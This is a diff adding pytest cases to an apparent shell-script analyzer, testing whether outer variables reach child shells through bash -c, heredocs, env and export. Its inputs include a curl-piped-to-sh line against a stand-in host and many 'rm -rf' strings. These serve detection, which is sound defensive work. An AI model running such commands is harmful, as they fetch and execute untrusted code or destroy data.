@@ -109,8 +109,83 @@ def test_embedded_constant_used_before_its_assignment_is_unknown() -> None:
 
 
 def test_embedded_code_still_sees_outer_constants() -> None:
+    # The outer shell expands "$c" before bash runs the string.
     model = _model('c=curl\nbash -c "$c https://x.example/i | sh"')
     assert "curl" in _names(model)
+
+
+def _child_rm(body: str) -> Arg:
+    [rm] = _run(_model(body), "rm")
+    return rm.args[-1]
+
+
+@pytest.mark.parametrize(
+    "body",
+    [
+        "D=/opt/x\nbash -c 'rm -rf \"$D\"'",  # not exported
+        "D=/opt/x\nsh <<'EOF'\nrm -rf \"$D\"\nEOF",  # quoted delimiter
+        "D=/opt/x\nbash <<< 'rm -rf \"$D\"'",  # single-quoted here-string
+        'D=/opt/x\nbash -c "rm -rf \\"\\$D\\""',  # escaped in "..."
+        "export D=/opt/x\nenv -u D bash -c 'rm -rf \"$D\"'",
+        "export D=/opt/x\nenv -uD bash -c 'rm -rf \"$D\"'",
+        "export D=/opt/x\nenv --unset=D bash -c 'rm -rf \"$D\"'",
+        "export D=/opt/x\nenv -i bash -c 'rm -rf \"$D\"'",
+        "export D=/opt/x\nsudo bash -c 'rm -rf \"$D\"'",
+        "f() { export D=/opt/x; }\nf\nbash -c 'rm -rf \"$D\"'",
+    ],
+    ids=[
+        "unexported",
+        "quoted-heredoc",
+        "here-string",
+        "escaped",
+        "env-u",
+        "env-uD",
+        "env-unset",
+        "env-i",
+        "sudo",
+        "export-in-function",
+    ],
+)
+def test_child_shell_does_not_see_an_unpassed_variable(body: str) -> None:
+    assert _child_rm(body).values is None
+
+
+@pytest.mark.parametrize(
+    "body",
+    [
+        "export D=/opt/x\nbash -c 'rm -rf \"$D\"'",
+        "D=/opt/x\nexport D\nbash -c 'rm -rf \"$D\"'",
+        "declare -x D=/opt/x\nbash -c 'rm -rf \"$D\"'",
+        "D=/opt/x bash -c 'rm -rf \"$D\"'",
+        "env D=/opt/x bash -c 'rm -rf \"$D\"'",
+        'D=/opt/x\nbash -c "rm -rf \\"$D\\""',  # the outer shell expands it
+        'D=/opt/x\nsh <<EOF\nrm -rf "$D"\nEOF',  # unquoted heredoc
+        "D=/opt/x\nsource /dev/stdin <<< 'rm -rf \"$D\"'",  # same shell
+    ],
+    ids=[
+        "export",
+        "export-later",
+        "declare-x",
+        "prefix",
+        "env",
+        "double-quoted",
+        "heredoc",
+        "source",
+    ],
+)
+def test_child_shell_sees_a_passed_variable(body: str) -> None:
+    assert _child_rm(body).values == frozenset({"/opt/x"})
+
+
+def test_command_assignment_overrides_the_outer_value() -> None:
+    assert _child_rm("export D=/opt/x\nenv D= bash -c 'rm -rf \"$D\"'").values == (
+        frozenset({""})
+    )
+
+
+def test_export_after_the_child_does_not_count() -> None:
+    body = "D=/opt/x\nbash -c 'rm -rf \"$D\"'\nexport D"
+    assert _child_rm(body).values is None
 
 
 def test_sh_c_with_clustered_flags() -> None:
